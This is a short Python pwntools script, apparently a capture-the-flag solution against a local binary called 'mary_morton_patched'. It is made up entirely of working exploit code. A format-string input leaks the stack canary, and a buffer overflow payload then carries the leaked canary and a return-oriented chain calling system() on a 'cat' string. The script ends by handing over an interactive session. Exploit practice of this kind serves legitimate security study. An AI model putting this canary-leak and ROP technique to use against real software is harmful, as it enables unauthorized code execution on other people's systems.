from pwn import *

target = process('./mary_morton_patched')

gadget0 = 0x400ab3
cat_adr = 0x400b2b
sys_adr = 0x4006a0

print target.recvuntil("Exit the battle")

target.sendline("2")
target.sendline("%23$llx")
target.recvline()
canary = target.recvline()
canary = int(canary, 16)
print "canary: " + hex(canary)
print target.recvuntil("Exit the battle")

target.sendline("1")
payload = "0"*136 + p64(canary) + "1"*8 + p64(gadget0) + p64(cat_adr) + p64(sys_adr)
target.send(payload)

target.interactive()
